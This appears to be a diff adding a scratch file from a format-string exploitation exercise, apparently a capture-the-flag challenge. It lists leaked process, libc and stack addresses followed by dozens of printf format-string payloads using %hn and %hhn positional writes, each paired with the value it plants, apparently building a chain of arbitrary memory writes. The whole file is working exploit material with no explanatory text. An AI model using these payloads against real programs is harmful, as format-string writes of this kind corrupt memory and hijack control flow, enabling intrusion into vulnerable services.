@@ -1,0 +1,64 @@
+
+a1 = 0x55934da9b240
+a2 = 0x55934c64fb92
+a3 = 0x7fb98f7323f1
+a4 = 0x7ffe489bb960
+
+libc = 0x7fb98f712000
+
+
+%5c%31$hhn       0x5
+%32735c%35$hn    0x7fdf
+%3c%31$hhn       0x3
+%18556c%35$hn    0x487c
+%1c%31$hhn       0x1
+%47609c%35$hn    0xb9f9   # 0x7fb9f9487c
+%4132c%37$hn     0x1024
+%9c%35$hhn       0x9
+%7515c%37$hn     0x1d5b
+%11c%35$hhn      0xb
+%36692c%37$hn    0x8f54
+%13c%35$hhn      0xd
+%32666c%37$hn    0x7f9a
+%15c%35$hhn      0xf
+%65505c%37$hn    0xffe1
+%17c%35$hhn      0x11
+%24609c%37$hn    0x6021
+%19c%35$hhn      0x13
+%36750c%37$hn    0x8f8e
+%21c%35$hhn      0x15
+%32666c%37$hn    0x7f9a
+%23c%35$hhn      0x17
+%65505c%37$hn    0xffe1
+%25c%35$hhn      0x19
+%8145c%37$hn     0x1fd1
+%27c%35$hhn      0x1b
+%36697c%37$hn    0x8f59
+%29c%35$hhn      0x1d
+%32666c%37$hn    0x7f9a
+%31c%35$hhn      0x1f
+%65505c%37$hn    0xffe1
+%33c%35$hhn      0x21
+%6692c%37$hn     0x1a24
+%35c%35$hhn      0x23
+%36692c%37$hn    0x8f54
+%37c%35$hhn      0x25
+%32666c%37$hn    0x7f9a
+%39c%35$hhn      0x27
+%65505c%37$hn    0xffe1
+%41c%35$hhn      0x29
+%24601c%37$hn    0x6019
+%43c%35$hhn      0x2b
+%36750c%37$hn    0x8f8e
+%45c%35$hhn      0x2d
+%32666c%37$hn    0x7f9a
+%47c%35$hhn      0x2f
+%65505c%37$hn    0xffe1
+%49c%35$hhn      0x31
+%17542c%37$hn    0x4486
+%51c%35$hhn      0x33
+%36694c%37$hn    0x8f56
+%53c%35$hhn      0x35
+%32666c%37$hn    0x7f9a
+%55c%35$hhn      0x37
+%65505c%37$hn    0xffe1
